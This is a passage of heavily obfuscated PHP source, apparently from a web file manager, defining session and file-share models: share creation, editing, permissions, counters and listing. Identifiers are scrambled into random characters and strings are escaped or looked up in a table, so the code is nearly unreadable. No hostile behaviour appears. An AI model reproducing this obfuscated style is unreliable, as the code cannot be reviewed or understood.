$this->pathParse[$Ê™Ëò×Í[505]]; if (trim($©³—á·ó, $Ê™Ëò×Í[8]) == trim(get_path_father($©³—á·ó), $Ê™Ëò×Í[8])) { $äØ¼Ï° = !0; } return IO::init($Ê™Ëò×Í[12])->listAllSimpleMake($¥õÊû²±, $©³—á·ó, $äØ¼Ï°); } public function getPathOuter($ú×±ÏÎ) { $«Â“ŞÊ» =& $_SERVER[É¨™èà]; $€¾–²ë = KodIO::parse($ú×±ÏÎ); if ($€¾–²ë[$«Â“ŞÊ»[33]] == KodIO::KOD_SHARE_ITEM) { return $€¾–²ë[$«Â“ŞÊ»[87]]; } $—áºÊå = KodIO::clear($ú×±ÏÎ); $ÉµÉë¼ = KodIO::clear($this->pathParse[$«Â“ŞÊ»[572]][$«Â“ŞÊ»[1277]]); $Ç‹Î”Á = substr($—áºÊå, strlen($ÉµÉë¼)); if (substr($—áºÊå, 0, strlen($ÉµÉë¼)) != $ÉµÉë¼) { return !1; } return $this->pathParse[$«Â“ŞÊ»[1270]] . $«Â“ŞÊ»[8] . ltrim($Ç‹Î”Á, $«Â“ŞÊ»[8]); } public function getType() { $µâæ€¼™ =& $_SERVER[É¨™èà]; $ô»ÑÔÀÏ = str_replace($µâæ€¼™[77], $µâæ€¼™[12], get_class($this)); return strtolower($ô»ÑÔÀÏ); } public function isOsDriver($â ºÇ½³) { return IO::isOsDriver($â ºÇ½³); } public function info($Î¼â¢º°) { return $this->infoParse($Î¼â¢º°); } public function infoAuth($–«Ì¼êï) { return $this->infoParse($–«Ì¼êï); } public function infoWithChildren($†æ²ğêÔ) { return $this->infoParse($†æ²ğêÔ, !0); } public function infoFull($‰’Â€×) { return $this->infoParse($‰’Â€×); } } goto A¾©©œÈ³; cĞñÏ·ƒ«¤: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\x6d\137\x73\145\x73\163\x69\157\156"; public function get($¦ğ»Œ¬Ç) { $âÂÆ²…• =& $_SERVER[É¨™èà]; $ãµ¿““´ = $this->where(array($âÂÆ²…•[2138] => $¦ğ»Œ¬Ç))->find(); if (!is_array($ãµ¿““´)) { return !1; } return $ãµ¿““´[$âÂÆ²…•[171]]; } public function set($¨‚è„×ø, $Îë‡ŒÕ, $´’»„üÙ = 3600) { $¤”ûŸÃ† =& $_SERVER[É¨™èà]; $î”àšğá = array($¤”ûŸÃ†[2138] => $¨‚è„×ø, $¤”ûŸÃ†[2038] => $Îë‡ŒÕ, $¤”ûŸÃ†[2139] => $´’»„üÙ + time()); if (Session::get($¤”ûŸÃ†[2140])) { $î”àšğá[$¤”ûŸÃ†[1800]] = Session::get($¤”ûŸÃ†[2140]); } else { $î”àšğá[$¤”ûŸÃ†[1800]] = 0; } if ($this->get($¨‚è„×ø)) { return $this->where(array($¤”ûŸÃ†[2138] => $¨‚è„×ø))->save($î”àšğá); } else { return $this->add($î”àšğá, array(), !0); } } public function remove($ƒ§¥ºÇÚ) { return $this->where(array($_SERVER[É¨™èà][2138] => $ƒ§¥ºÇÚ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[É¨™èà][2141] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\151\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\x72\x74\x2c\165\x70\144\141\x74\x65", "\x66\165\156\x63\x74\151\157\x6e"), array("\143\162\145\x61\x74\145\x54\151\155\x65", "\164\x69\x6d\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\156\x63\164\x69\x6f\156"), array("\157\160\164\x69\157\156\163", '', "\x69\x6e\x73\x65\x72\164\x2c\x75\x70\144\x61\x74\145\x2c\163\x65\154\145\x63\x74", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÜÎˆÈ˜‚) { $ü¤®ùÈÑ =& $_SERVER[É¨™èà]; $òß´­ŒÄ = isset($ÜÎˆÈ˜‚[0]) ? $ÜÎˆÈ˜‚[0] : !1; $îåé†­‘ = $ü¤®ùÈÑ[2142] . USER_ID; return array($ü¤®ùÈÑ[2143] => array(USER_ID, $ü¤®ùÈÑ[2144]), $ü¤®ùÈÑ[2083] => array($òß´­ŒÄ, $ü¤®ùÈÑ[2145], $îåé†­‘)); } protected function listSimple() { $ßêüí¼ = array($_SERVER[É¨™èà][1800] => USER_ID); $àïò£Õ˜ = $this->field($this->fieldList)->where($ßêüí¼)->select(); return $àïò£Õ˜ ? $àïò£Õ˜ : array(); } protected function getInfo($¤ÏÔÉ‚ß, $ÌãÜšÄ = false, $ŸÅ•ÉÂÆ = '') { $ââêÍŞñ =& $_SERVER[É¨™èà]; if (!$ŸÅ•ÉÂÆ) { $ŸÅ•ÉÂÆ = $ââêÍŞñ[2142] . USER_ID; } if ($ÌãÜšÄ) { return $this->_getShareInfo(array($ââêÍŞñ[680] => $¤ÏÔÉ‚ß)); } $çÄ‚Áíô = $this->cacheFunctionGet($ââêÍŞñ[2085], $¤ÏÔÉ‚ß, $ŸÅ•ÉÂÆ); $‘¡ĞŞ“é = $this->shareInfoMofify($çÄ‚Áíô, $ââêÍŞñ[226]); if (isset($çÄ‚Áíô[$ââêÍŞñ[88]]) && $‘¡ĞŞ“é != $çÄ‚Áíô[$ââêÍŞñ[88]]) { $ÈÈ¿Õœã = $this->cacheKeyMake($ââêÍŞñ[2085], $¤ÏÔÉ‚ß, $ŸÅ•ÉÂÆ); $çÄ‚Áíô = $this->_getShareInfo(array($ââêÍŞñ[680] => $¤ÏÔÉ‚ß)); Cache::set($ÈÈ¿Õœã, $çÄ‚Áíô); } return $çÄ‚Áíô; } private function shareInfoMofify(&$òòÇÜÇû, $ ©Ë…È = "\x67\x65\x74") { $‹ô«¼¶¥ =& $_SERVER[É¨™èà]; if (!$òòÇÜÇû || !isset($òòÇÜÇû[$‹ô«¼¶¥[680]])) { return; } $Âô›±êñ = $‹ô«¼¶¥[2146] . $òòÇÜÇû[$‹ô«¼¶¥[680]]; if ($ ©Ë…È == $‹ô«¼¶¥[226]) { return Cache::get($Âô›±êñ); } else { if ($ ©Ë…È == $‹ô«¼¶¥[2114]) { $µªõ£Œ = Cache::get($Âô›±êñ); if ($µªõ£Œ === $òòÇÜÇû[$‹ô«¼¶¥[88]]) { return; } $òòÇÜÇû[$‹ô«¼¶¥[2147]] = USER_ID . $‹ô«¼¶¥[472] . $òòÇÜÇû[$‹ô«¼¶¥[88]]; Cache::set($Âô›±êñ, $òòÇÜÇû[$‹ô«¼¶¥[88]]); } else { if ($ ©Ë…È == $‹ô«¼¶¥[2148]) { Cache::remove($Âô›±êñ); } } } } public function getInfoByHash($Ş¶ıó§Ê) { return $this->_getShareInfo(array($_SERVER[É¨™èà][2149] => $Ş¶ıó§Ê)); } public function getInfoByPath($»ÉÇÀæÕ) { $Ä˜°å =& $_SERVER[É¨™èà]; $€®áÖú = array($Ä˜°å[1800] => USER_ID, $Ä˜°å[194] => $»ÉÇÀæÕ); return $this->_getShareInfo($€®áÖú); } public function getInfoBySourcePath($î×Ä³¹·) { $Èğ»­ÏÄ =& $_SERVER[É¨™èà]; $’¿ÀÂÎˆ = array($Èğ»­ÏÄ[1800] => USER_ID, $Èğ»­ÏÄ[1277] => $î×Ä³¹·); return $this->_getShareInfo($’¿ÀÂÎˆ); } private function _getShareInfo($ÊñÛÏ¿á) { $ÈĞ©˜òÒ =& $_SERVER[É¨™èà]; $ˆ¦áÇ‚š = $this->where($ÊñÛÏ¿á)->find(); if (!$ˆ¦áÇ‚š) { return !1; } $ÊñÛÏ¿á = array($ÈĞ©˜òÒ[680] => $ˆ¦áÇ‚š[$ÈĞ©˜òÒ[680]]); $åÄÍòØ‡ = $ÈĞ©˜òÒ[2150]; $ÌÑŠ±½× = Model($ÈĞ©˜òÒ[681])->order($ÈĞ©˜òÒ[485])->field($åÄÍòØ‡)->where($ÊñÛÏ¿á)->select(); if ($ˆ¦áÇ‚š[$ÈĞ©˜òÒ[194]] == $ÈĞ©˜òÒ[231]) { $ˆ¦áÇ‚š[$ÈĞ©˜òÒ[90]] = IO::info($ˆ¦áÇ‚š[$ÈĞ©˜òÒ[1277]]); } else { $ˆ¦áÇ‚š[$ÈĞ©˜òÒ[90]] = Model($ÈĞ©˜òÒ[1448])->pathInfo($ˆ¦áÇ‚š[$ÈĞ©˜òÒ[194]]); } $ˆ¦áÇ‚š[$ÈĞ©˜òÒ[2151]] = $ÌÑŠ±½×; $this->shareInfoMofify($ˆ¦áÇ‚š, $ÈĞ©˜òÒ[2114]); return $ˆ¦áÇ‚š; } protected function getInfoAuth($û›´¼Œ§) { $›ïí· =& $_SERVER[É¨™èà]; $™ÃÓïÜ€ = $this->getInfo($û›´¼Œ§); if ($™ÃÓïÜ€[$›ïí·[1800]] == USER_ID) { $™ÃÓïÜ€[$›ïí·[497]] = $™ÃÓïÜ€[$›ïí·[90]][$›ïí·[497]]; } else { $™ÃÓïÜ€[$›ïí·[497]] = Model($›ïí·[579])->authMake($™ÃÓïÜ€[$›ïí·[2151]]); } return $™ÃÓïÜ€; } protected function listData($Ù¦ÃÌêö = null, $ùå­õê = 300) { $Óõ¸Ù§ =& $_SERVER[É¨™èà]; $…¡–Ü²Ô = array(array($Óõ¸Ù§[574] => array($Óõ¸Ù§[1106], 0), $Óõ¸Ù§[678] => array($Óõ¸Ù§[1106], 0), $Óõ¸Ù§[2152] => $Óõ¸Ù§[2102])); if ($Ù¦ÃÌêö == $Óõ¸Ù§[2153]) { $…¡–Ü²Ô = array($Óõ¸Ù§[574] => 1); } else { if ($Ù¦ÃÌêö == $Óõ¸Ù§[1260]) { $…¡–Ü²Ô = array($Óõ¸Ù§[678] => 1); } } $…¡–Ü²Ô[$Óõ¸Ù§[1800]] = USER_ID; $†ÎïèùÑ = $this->where($…¡–Ü²Ô)->selectPage($ùå­õê); return $†ÎïèùÑ; } protected function listToMe($ßÏñßúÖ = 300) { $ÛóšŒ† =& $_SERVER[É¨™èà]; $¸¢ŒŸ¯ö = Model($ÛóšŒ†[2154])->userGroupParents(USER_ID); $îõ¥´Óß = array($ÛóšŒ†[663] => SourceModel::TYPE_USER, $ÛóšŒ†[581] => USER_ID); if ($¸¢ŒŸ¯ö) { $îõ¥´Óß = array(array($ÛóšŒ†[663] => SourceModel::TYPE_USER, $ÛóšŒ†[581] => USER_ID), array($ÛóšŒ†[663] => SourceModel::TYPE_GROUP, $ÛóšŒ†[581] => array($ÛóšŒ†[7], $¸¢ŒŸ¯ö)), $ÛóšŒ†[2152] => $ÛóšŒ†[2102]); } $İœÚÆ„– = Model($ÛóšŒ†[681])->where($îõ¥´Óß)->selectPage($ßÏñßúÖ); $®á¥ÌÑ¤ = array_to_keyvalue_group($İœÚÆ„–[$ÛóšŒ†[456]], $ÛóšŒ†[680]); if (!$®á¥ÌÑ¤) { return $İœÚÆ„–; } $æš¿àéĞ = $ÛóšŒ†[2155]; $îõ¥´Óß = array($ÛóšŒ†[680] => array($ÛóšŒ†[502], array_keys($®á¥ÌÑ¤)), $ÛóšŒ†[1800] => array($ÛóšŒ†[1108], $ÛóšŒ†[231])); $ôÂÄº© = $this->field($æš¿àéĞ)->where($îõ¥´Óß)->select(); foreach ($ôÂÄº© as $˜Ô¡„¿À => &$º›Ò¢Öè) { $º›Ò¢Öè[$ÛóšŒ†[2151]] = $®á¥ÌÑ¤[$º›Ò¢Öè[$ÛóšŒ†[680]]]; } unset($º›Ò¢Öè); $Ìµ™å”“ = array($ÛóšŒ†[2156] => $ôÂÄº©, $ÛóšŒ†[2157] => $İœÚÆ„–[$ÛóšŒ†[453]]); return $Ìµ™å”“; } protected function shareAdd($Æ¹ÚÏÓÁ, $„°ÂÕ°û) { $ÒŸÚµıì =& $_SERVER[É¨™èà]; $é¬¦—¯Ì = $this->_addShareData($Æ¹ÚÏÓÁ, $„°ÂÕ°û); if (!empty($„°ÂÕ°û[$ÒŸÚµıì[2158]])) { $this->_shareAuthSet($é¬¦—¯Ì, $„°ÂÕ°û[$ÒŸÚµıì[2158]]); } $this->shareEventAdd($Æ¹ÚÏÓÁ, $„°ÂÕ°û, $ÒŸÚµıì[2159]); return $é¬¦—¯Ì; } protected function shareAddSystem($÷¦ìæ», $‡ìïİêö) { $Ìæ×ñÊ =& $_SERVER[É¨™èà]; $ÒîÕ›ãô = $this->_addShareData($÷¦ìæ», $‡ìïİêö, $Ìæ×ñÊ[192]); $this->_shareAuthSet($ÒîÕ›ãô, $‡ìïİêö[$Ìæ×ñÊ[2158]]); return $ÒîÕ›ãô; } private function shareEventAdd($³§ËÌï§, $Ùúôµ˜¤, $éÎ¿¨Ã– = "\141\144\x64") { $É¼äûÙ¾ =& $_SERVER[É¨™èà]; if (!$³§ËÌï§ || $³§ËÌï§ == $É¼äûÙ¾[231]) { return; } if ($éÎ¿¨Ã– == $É¼äûÙ¾[2159]) { if ($Ùúôµ˜¤[$É¼äûÙ¾[574]] == $É¼äûÙ¾[91]) { Model($É¼äûÙ¾[648])->eventShare($³§ËÌï§, $É¼äûÙ¾[2160]); } if ($Ùúôµ˜¤[$É¼äûÙ¾[678]] == $É¼äûÙ¾[91]) { Model($É¼äûÙ¾[648])->eventShare($³§ËÌï§, $É¼äûÙ¾[2161]); } return; } $…ïÒ‚ï› = $this->getInfoByPath($³§ËÌï§); $çä´‹Ï = $É¼äûÙ¾[2162]; if ($…ïÒ‚ï›[$É¼äûÙ¾[574]] == $É¼äûÙ¾[231] && $Ùúôµ˜¤[$É¼äûÙ¾[574]] == $É¼äûÙ¾[91]) { $çä´‹Ï = $É¼äûÙ¾[2160]; } if ($…ïÒ‚ï›[$É¼äûÙ¾[574]] == $É¼äûÙ¾[91] && $Ùúôµ˜¤[$É¼äûÙ¾[574]] == $É¼äûÙ¾[231]) { $çä´‹Ï = $É¼äûÙ¾[2163]; } if ($…ïÒ‚ï›[$É¼äûÙ¾[678]] == $É¼äûÙ¾[231] && $Ùúôµ˜¤[$É¼äûÙ¾[678]] == $É¼äûÙ¾[91]) { $çä´‹Ï = $É¼äûÙ¾[2161]; } if ($…ïÒ‚ï›[$É¼äûÙ¾[678]] == $É¼äûÙ¾[91] && $Ùúôµ˜¤[$É¼äûÙ¾[678]] == $É¼äûÙ¾[231]) { $çä´‹Ï = $É¼äûÙ¾[2164]; } Model($É¼äûÙ¾[648])->eventShare($³§ËÌï§, $çä´‹Ï); return; } private function _addShareData($ÒıõğÅĞ, $ÇœÜ²Ä¦ = array(), $ŒÄãâõ = false) { $•ØÜòéõ =& $_SERVER[É¨™èà]; $³Îıä‰ = $ŒÄãâõ == $•ØÜòéõ[192] ? 0 : USER_ID; $¥òÓä = array($•ØÜòéõ[501] => $ÒıõğÅĞ, $•ØÜòéõ[1791] => $³Îıä‰); if ($ÒıõğÅĞ == 0) { $¥òÓä = array($•ØÜòéõ[2165] => $ÇœÜ²Ä¦[$•ØÜòéõ[1277]], $•ØÜòéõ[1791] => $³Îıä‰); } if ($ëšŠº‰ª = $this->where($¥òÓä)->find()) { return $ëšŠº‰ª[$•ØÜòéõ[680]]; } if ($ÒıõğÅĞ == 0) { $ôóñáÁÓ = array($•ØÜòéõ[32] => get_path_this($ÇœÜ²Ä¦[$•ØÜòéõ[87]])); } else { $ôóñáÁÓ = Model($•ØÜòéõ[921])->sourceInfo($ÒıõğÅĞ); if (!$ôóñáÁÓ) { return !1; } } if (!$ÇœÜ²Ä¦[$•ØÜòéõ[1687]]) { $ÇœÜ²Ä¦[$•ØÜòéõ[1687]] = $ôóñáÁÓ[$•ØÜòéõ[32]]; } $¿½’¤Šò = array($•ØÜòéõ[1791] => $³Îıä‰, $•ØÜòéõ[501] => $ÒıõğÅĞ, $•ØÜòéõ[1687] => $•ØÜòéõ[12], $•ØÜòéõ[574] => 0, $•ØÜòéõ[678] => 0, $•ØÜòéõ[1277] => $•ØÜòéõ[12], $•ØÜòéõ[393] => $•ØÜòéõ[12], $•ØÜòéõ[983] => $•ØÜòéõ[12], $•ØÜòéõ[2166] => 0, $•ØÜòéõ[2167] => 0, $•ØÜòéõ[852] => 0, $•ØÜòéõ[2168] => $•ØÜòéõ[12], $•ØÜòéõ[2149] => $•ØÜòéõ[12]); $”‡Ş¥¾î = explode($•ØÜòéõ[50], $•ØÜòéõ[2169]); foreach ($”‡Ş¥¾î as $è…èòü´) { if (!isset($ÇœÜ²Ä¦[$è…èòü´])) { continue; } $¿½’¤Šò[$è…èòü´] = $ÇœÜ²Ä¦[$è…èòü´]; } $åıŠÏõ… = $this->add($¿½’¤Šò); $¤¦î€¦Â = array($•ØÜòéõ[2149] => short_id($åıŠÏõ…)); if ($this->where($¤¦î€¦Â)->find()) { $¤¦î€¦Â[$•ØÜòéõ[2149]] .= $•ØÜòéõ[472] . rand_string(2, 3); } $this->where(array($•ØÜòéõ[2170] => $åıŠÏõ…))->save($¤¦î€¦Â); return $åıŠÏõ…; } private function _shareAuthSet($ëãõºÁÈ, $ê“—ÆàÊ) { $ú¡õ…÷ =& $_SERVER[É¨™èà]; if (!is_array($ê“—ÆàÊ)) { return !1; } $¤­ ÛÄ‰ = Model($ú¡õ…÷[2112]); $¤­ ÛÄ‰->where(array($ú¡õ…÷[680] => $ëãõºÁÈ))->delete(); $‚Ïï§àğ = array(); foreach ($ê“—ÆàÊ as $ÆˆÖ ¿Ä) { $à®Ñá˜ú = SourceModel::TYPE_USER; if ($ÆˆÖ ¿Ä[$ú¡õ…÷[191]] == SourceModel::TYPE_GROUP) { $à®Ñá˜ú = SourceModel::TYPE_GROUP; } $ ÚŞ’Ÿ = array($ú¡õ…÷[680] => $ëãõºÁÈ, $ú¡õ…÷[191] => $à®Ñá˜ú, $ú¡õ…÷[581] => intval($ÆˆÖ ¿Ä[$ú¡õ…÷[581]]), $ú¡õ…÷[2108] => 0, $ú¡õ…÷[2171] => -1); if ($ÆˆÖ ¿Ä[$ú¡õ…÷[2108]]) { $ ÚŞ’Ÿ[$ú¡õ…÷[2108]] = $ÆˆÖ ¿Ä[$ú¡õ…÷[2108]]; } else { if ($ÆˆÖ ¿Ä[$ú¡õ…÷[2171]]) { $ ÚŞ’Ÿ[$ú¡õ…÷[2171]] = $ÆˆÖ ¿Ä[$ú¡õ…÷[2171]]; } } $‚Ïï§àğ[] = $ ÚŞ’Ÿ; } return $¤­ ÛÄ‰->addAll($‚Ïï§àğ, array(), !0); } public function numViewAdd($ÎáÛîŠÓ) { $õó¡×ÌÔ =& $_SERVER[É¨™èà]; $œš©ßÌ’ = array($õó¡×ÌÔ[2170] => $ÎáÛîŠÓ); $this->where($œš©ßÌ’)->setAdd($õó¡×ÌÔ[2166]); } public function numDownloadAdd($Ó–­ª¸) { $ô¸²éĞØ =& $_SERVER[É¨™èà]; $’¼ÛÍ¯Â = array($ô¸²éĞØ[2170] => $Ó–­ª¸); $this->where($’¼ÛÍ¯Â)->setAdd($ô¸²éĞØ[2167]); } protected function shareEdit($ç÷„ËºÒ, $ŞÓ±«íù) { $Ëœ×ÍØ„ =& $_SERVER[É¨™èà]; $ö …àá = $this->getInfo($ç÷„ËºÒ); if (!$ö …àá) { return !1; } if ($ŞÓ±«íù[$Ëœ×ÍØ„[2149]] && $ŞÓ±«íù[$Ëœ×ÍØ„[574]] == $Ëœ×ÍØ„[91]) { if ($ŞÓ±«íù[$Ëœ×ÍØ„[2149]] == $ö …àá[$Ëœ×ÍØ„[2149]]) { unset($ŞÓ±«íù[$Ëœ×ÍØ„[2149]]); } if ($ŞÓ±«íù[$Ëœ×ÍØ„[2149]]) { $ÉÑÃè‘Û = $this->where(array($Ëœ×ÍØ„[2172] => $ŞÓ±«íù[$Ëœ×ÍØ„[2149]]))->find(); if ($ÉÑÃè‘Û) { return !1; } if (!is_array($ŞÓ±«íù[$Ëœ×ÍØ„[2168]])) { $ŞÓ±«íù[$Ëœ×ÍØ„[2168]] = array(); } if (!$ŞÓ±«íù[$Ëœ×ÍØ„[2168]][$Ëœ×ÍØ„[2173]]) { $ŞÓ±«íù[$Ëœ×ÍØ„[2168]][$Ëœ×ÍØ„[2173]] = $ö …àá[$Ëœ×ÍØ„[2149]]; $ŞÓ±«íù[$Ëœ×ÍØ„[2168]][$Ëœ×ÍØ„[2174]] = $Ëœ×ÍØ„[91]; } } } $this->_checkLinkShare($ŞÓ±«íù, $ö …àá); $êØ«‰ˆô = array(); $ÌªŒÈªŒ = explode($Ëœ×ÍØ„[50], $Ëœ×ÍØ„[2175]); foreach ($ÌªŒÈªŒ as $•ÙŒ¸°Õ) { if (!array_key_exists($•ÙŒ¸°Õ, $ŞÓ±«íù)) { continue; } $êØ«‰ˆô[$•ÙŒ¸°Õ] = $ŞÓ±«íù[$•ÙŒ¸°Õ]; } $this->shareEventAdd($ö …àá[$Ëœ×ÍØ„[194]], $ŞÓ±«íù, $Ëœ×ÍØ„[1969]); $this->where(array($Ëœ×ÍØ„[2170] => $ç÷„ËºÒ))->save($êØ«‰ˆô); if (isset($ŞÓ±«íù[$Ëœ×ÍØ„[2158]])) { $this->_shareAuthSet($ç÷„ËºÒ, $ŞÓ±«íù[$Ëœ×ÍØ„[2158]]); } return !0; } private function _checkLinkShare($Ø´¾¿î¦, $ÊŒé—Á) { $î®ˆ«¢† =& $_SERVER[É¨™èà]; if ($Ø´¾¿î¦[$î®ˆ«¢†[574]] != $î®ˆ«¢†[91]) { return; } $Ş·öæå£ = $ÊŒé—Á[$î®ˆ«¢†[90]][$î®ˆ«¢†[194]]; if ($ÊŒé—Á[$î®ˆ«¢†[90]][$î®ˆ«¢†[33]] != $î®ˆ«¢†[233]) { $ØÚ»ûæ = $this->_folderReport($Ş·öæå£); if (!$ØÚ»ûæ) { return; } show_json(LNG($î®ˆ«¢†[2176]) . $î®ˆ«¢†[2177] . $ØÚ»ûæ, !1); } $—íøØ‡Õ = Model($î®ˆ«¢†[921])->fileInfoGet($ÊŒé—Á[$î®ˆ«¢†[90]][$î®ˆ«¢†[194]]); if (!$—íøØ‡Õ) { return; } $ßãÓ££³ = $this->shareFileMeta($—íøØ‡Õ[$î®ˆ«¢†[553]]); if (isset($ßãÓ££³[$î®ˆ«¢†[461]]) && $ßãÓ££³[$î®ˆ«¢†[461]] == $î®ˆ«¢†[91]) { show_json(LNG($î®ˆ«¢†[2178]), !1); } } private function _folderReport($°¥şè…«) { $¡î†ûèÀ =& $_SERVER[É¨™èà]; $—™¢…Ù‚ = array($¡î†ûèÀ[553] => array($¡î†ûèÀ[1106], 0), $¡î†ûèÀ[840] => 3); $Š¯ù¦Õ = Model($¡î†ûèÀ[2179])->where($—™¢…Ù‚)->field($¡î†ûèÀ[553])->select(); if (!$Š¯ù¦Õ) { return !1; } $Š¯ù¦Õ = array_to_keyvalue($Š¯ù¦Õ, $¡î†ûèÀ[12], $¡î†ûèÀ[553]); $êƒçŞ = $¡î†ûèÀ[50] . $°¥şè…« . $¡î†ûèÀ[50]; $—™¢…Ù‚ = array($¡î†ûèÀ[553] => array($¡î†ûèÀ[7], $Š¯ù¦Õ), $¡î†ûèÀ[596] => array($¡î†ûèÀ[469], "\x25{$êƒçŞ}\x25"), $¡î†ûèÀ[515] => 0); $øÀÏËôÀ = Model($¡î†ûèÀ[921])->where($—™¢…Ù‚)->field($¡î†ûèÀ[2180])->find(); if (!$øÀÏËôÀ) { return !1; } $ñí„ÁÂè = substr($øÀÏËôÀ[$¡î†ûèÀ[596]], strpos($øÀÏËôÀ[$¡î†ûèÀ[596]], $êƒçŞ)); $—™¢…Ù‚ = array($¡î†ûèÀ[194] => array($¡î†ûèÀ[7], trim($ñí„ÁÂè, $¡î†ûèÀ[50]))); $Ùå¦ÁÕß = Model($¡î†ûèÀ[921])->where($—™¢…Ù‚)->field($¡î†ûèÀ[32])->select(); $·Ã™‹¶Ö = array_to_keyvalue($Ùå¦ÁÕß, $¡î†ûèÀ[12], $¡î†ûèÀ[32]); $·Ã™‹¶Ö[] = $øÀÏËôÀ[$¡î†ûèÀ[32]]; return implode($¡î†ûèÀ[8], $·Ã™‹¶Ö); } protected function remove($§şÆŠŸû) { $˜ŒÆò«‡ =& $_SERVER[É¨™èà]; $ÑĞ…á·ì = is_array($§şÆŠŸû) ? $§şÆŠŸû : array($§şÆŠŸû); for ($Şì•¢×÷ = 0; $Şì•¢×÷ < count($ÑĞ…á·ì); $Şì•¢×÷++) { $‹——²ˆ£ = $this->getInfo($ÑĞ…á·ì[$Şì•¢×÷]); if ($‹——²ˆ£[$˜ŒÆò«‡[678]] == $˜ŒÆò«‡[91]) { Model($˜ŒÆò«‡[648])->eventShare($‹——²ˆ£[$˜ŒÆò«‡[194]], $˜ŒÆò«‡[2164]); } if ($‹——²ˆ£[$˜ŒÆò«‡[574]] == $˜ŒÆò«‡[91]) { Model($˜ŒÆò«‡[648])->eventShare($‹——²ˆ£[$˜ŒÆò«‡[194]], $˜ŒÆò«‡[2163]); } $this->shareInfoMofify($‹——²ˆ£, $˜ŒÆò«‡[2148]); } $›…Ú¬ñÅ = array($˜ŒÆò«‡[680] => array($˜ŒÆò«‡[7], $ÑĞ…á·ì)); $òöœ¦•½ = $this->where($›…Ú¬ñÅ)->delete(); if ($òöœ¦•½) { Model($˜ŒÆò«‡[681])->where($›…Ú¬ñÅ)->delete(); } return $òöœ¦•½; } protected function removeBySource($ÎË”¨ÃÙ) { $…Ä·Í¿Õ =& $_SERVER[É¨™èà]; $…·Ù±ÎŠ = array($…Ä·Í¿Õ[501] => array($…Ä·Í¿Õ[502], $ÎË”¨ÃÙ)); $€€èä = $this->field($…Ä·Í¿Õ[680])->where($…·Ù±ÎŠ)->select(); $÷ñˆ¼ÄÄ = array_to_keyvalue($€€èä, $…Ä·Í¿Õ[12], $…Ä·Í¿Õ[680]); if (!$÷ñˆ¼ÄÄ) { return; } foreach ($€€èä as $®¸–öº„) { $this->shareInfoMofify($®¸–öº„, $…Ä·Í¿Õ[2148]); } $…·Ù±ÎŠ = array($…Ä·Í¿Õ[2170] => array($…Ä·Í¿Õ[502], $÷ñˆ¼ÄÄ)); $this->where($…·Ù±ÎŠ)->delete(); Model($…Ä·Í¿Õ[681])->where($…·Ù±ÎŠ)->delete(); } public function listAll($¼«úÓº) { $„éË’œÉ =& $_SERVER[É¨™èà]; $Ìî»ü‚™ = array(); if ($¼«úÓº[$„éË’œÉ[1800]]) { $Ìî»ü‚™[$„éË’œÉ[1800]] = $¼«úÓº[$„éË’œÉ[1800]]; } if ($¼«úÓº[$„éË’œÉ[851]]) { $¯Ğ¦ç›ı = $¼«úÓº[$„éË’œÉ[852]] ? $¼«úÓº[$„éË’œÉ[852]] : strtotime(date($„éË’œÉ[2181])); $Ìî»ü‚™[$„éË’œÉ[234]] = array($„éË’œÉ[419], array($¼«úÓº[$„éË’œÉ[851]], $¯Ğ¦ç›ı)); } if ($¼«úÓº[$„éË’œÉ[33]]) { $Ìî»ü‚™[$¼«úÓº[$„éË’œÉ[33]]] = 1; } else { $Ìî»ü‚™[] = array($„éË’œÉ[574] => array($„éË’œÉ[1106], 0), $„éË’œÉ[678] => array($„éË’œÉ[1106], 0), $„éË’œÉ[2152] => $„éË’œÉ[2102]); } if ($¼«úÓº[$„éË’œÉ[2098]]) { $Ìî»ü‚™[] = array($„éË’œÉ[2149] => $¼«úÓº[$„éË’œÉ[2098]], $„éË’œÉ[1687] => array($„éË’œÉ[469], "\x25{$¼«úÓº[$„éË’œÉ[2098]]}\x25"), $„éË’œÉ[2152] => $„éË’œÉ[2102]); } $áñí¢™Ê = $this->_makeOrder()->where($Ìî»ü‚™)->selectPage(20); if (empty($áñí¢™Ê[$„éË’œÉ[456]])) { return array(); } $this->_listDataApply($áñí¢™Ê[$„éË’œÉ[456]]); return $áñí¢™Ê; } public function listDataApply($ß®Äü™) { $this->_listDataApply($ß®Äü™); return $ß®Äü™; } private function _listDataApply(&$íÒüÌûÀ) { $Ñ¹ÕºšÑ =& $_SERVER[É¨™èà]; $´„õ†’¤ = array_to_keyvalue($íÒüÌûÀ, $Ñ¹ÕºšÑ[12], $Ñ¹ÕºšÑ[1800]); $š¹ñ¸û = Model($Ñ¹ÕºšÑ[609])->userListInfo(array_unique($´„õ†’¤)); $Êâ¦¸Ñ = array_to_keyvalue($íÒüÌûÀ, $Ñ¹ÕºšÑ[12], $Ñ¹ÕºšÑ[194]); $ß¶Ğ¿§ö = Model($Ñ¹ÕºšÑ[921])->sourceListInfo($Êâ¦¸Ñ, !0); foreach ($íÒüÌûÀ as $‹·÷ÔÊã => &$¾ÜöİŸ ) { $Å¨ú³ë = $¾ÜöİŸ [$Ñ¹ÕºšÑ[1800]]; $¾ÜöİŸ [$Ñ¹ÕºšÑ[2182]] = $š¹ñ¸û[$Å¨ú³ë] ? $š¹ñ¸û[$Å¨ú³ë] : !1; if (!$¾ÜöİŸ [$Ñ¹ÕºšÑ[2182]] || $¾ÜöİŸ [$Ñ¹ÕºšÑ[2182]][$Ñ¹ÕºšÑ[840]] != $Ñ¹ÕºšÑ[91]) { unset($íÒüÌûÀ[$‹·÷ÔÊã]); continue; } $ßö²âøË = $¾ÜöİŸ [$Ñ¹ÕºšÑ[194]]; $¾ÜöİŸ [$Ñ¹ÕºšÑ[90]] = $ß¶Ğ¿§ö[$ßö²âøË] ? $ß¶Ğ¿§ö[$ßö²âøË] : !1; if ($¾ÜöİŸ [$Ñ¹ÕºšÑ[90]][$Ñ¹ÕºšÑ[515]] == $Ñ¹ÕºšÑ[91]) { unset($íÒüÌûÀ[$‹·÷ÔÊã]); } if ($¾ÜöİŸ [$Ñ¹ÕºšÑ[90]] != $Ñ¹ÕºšÑ[231] && !$¾ÜöİŸ [$Ñ¹ÕºšÑ[90]]) { unset($íÒüÌûÀ[$‹·÷ÔÊã]); } } 